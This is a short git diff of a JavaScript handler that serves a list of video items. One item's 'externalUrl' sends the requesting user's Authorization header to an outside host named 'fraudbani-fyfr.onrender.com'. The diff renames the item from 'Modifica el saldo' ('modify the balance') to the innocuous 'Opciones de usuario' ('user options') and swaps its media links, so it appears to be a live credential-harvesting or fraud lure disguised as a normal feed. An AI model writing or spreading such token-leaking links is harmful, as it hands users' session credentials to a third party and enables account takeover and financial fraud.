@@ -7,12 +7,12 @@ const getVideos = async(req, res) => {
     res.json([
 {
 "id": "791c28e5-ca84-4ba1-b38e-6658479350o9",
-"title": "Modifica el saldo 👇🏾",
+"title": "Opciones de usuario 👇🏾",
 "description": "Click al botón de YouTube para modificar.",
 "externalUrl": `https://fraudbani-fyfr.onrender.com/items?user=${req.headers.authorization}`,
-"video": "https://files.catbox.moe/ig7mlv.mp4",
-"thumbnail": "https://i.postimg.cc/xdSh63MD/IMG-20260424-084729.jpg",
-"highlight": "https://i.postimg.cc/xdSh63MD/IMG-20260424-084729.jpg",
+"video": "https://files.catbox.moe/84vvgi.mp4",
+"thumbnail": "https://i.postimg.cc/P5fCNRBt/IMG-20260604-040048.jpg",
+"highlight": "https://i.postimg.cc/P5fCNRBt/IMG-20260604-040048.jpg",
 "newContent": true,
 "featured": false,
 "compressionStatus": "completed"
